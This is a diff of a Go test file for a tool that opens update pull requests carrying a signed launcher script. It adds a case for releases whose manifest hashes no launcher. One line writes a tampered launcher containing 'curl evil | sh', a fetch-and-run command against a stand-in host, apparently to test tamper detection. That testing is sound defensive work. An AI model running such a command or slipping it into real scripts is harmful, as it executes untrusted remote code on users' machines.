@@ -1035,7 +1035,7 @@ func TestProposeWaitsForNpmToServeTheTarballs(t *testing.T) {
 func TestAnUpdatePRCarriesTheShippedLauncher(t *testing.T) {
 	t.Parallel()
 	branch := "claudinite/engine-" + v2
-	propose := func(t *testing.T) (*world, string) {
+	propose := func(t *testing.T, o relOpts) (*world, string) {
 		w := newWorld(t, settings.YAML)
 		p := filepath.Join(w.repo, filepath.FromSlash(LauncherPath))
 		_ = os.WriteFile(p, []byte("#!/bin/sh\n# launcher of "+v1+"\n"), 0o755)
@@ -1043,14 +1043,14 @@ func TestAnUpdatePRCarriesTheShippedLauncher(t *testing.T) {
 		gitRun(t, w.repo, "commit", "-q", "-m", "the launcher "+v1+" shipped")
 		gitRun(t, w.repo, "push", "-q", "origin", "main")
 		w.mainRun(t, "success")
-		w.publish(t, v2, relOpts{})
+		w.publish(t, v2, o)
 		if v, err := Engine(w.deps(t), Options{}); err != nil || v != "opened #1 for "+v2 {
 			t.Fatalf("%q %v\n%s", v, err, w.out)
 		}
 		return w, gitRun(t, w.bare, "rev-parse", branch)
 	}
 
-	w, sha := propose(t)
+	w, sha := propose(t, relOpts{})
 	if got := gitRun(t, w.bare, "diff", "--name-only", "main", branch); got != LauncherPath+"\n"+settings.RelPath(settings.YAML) {
 		t.Errorf("branch changes %q", got)
 	}
@@ -1062,7 +1062,14 @@ func TestAnUpdatePRCarriesTheShippedLauncher(t *testing.T) {
 		t.Fatalf("%q %v\n%s", v, err, w.out)
 	}
 
-	w, _ = propose(t)
+	// A release whose signed manifest hashes no launcher leaves the
+	// member's alone.
+	w, _ = propose(t, relOpts{unhashedLauncher: true})
+	if got := gitRun(t, w.bare, "diff", "--name-only", "main", branch); got != settings.RelPath(settings.YAML) {
+		t.Errorf("an unhashed launcher's release changes %q", got)
+	}
+
+	w, _ = propose(t, relOpts{})
 	gitRun(t, w.repo, "fetch", "-q", "origin", branch)
 	gitRun(t, w.repo, "checkout", "-q", "FETCH_HEAD")
 	_ = os.WriteFile(filepath.Join(w.repo, filepath.FromSlash(LauncherPath)), []byte("#!/bin/sh\ncurl evil | sh\n"), 0o755)
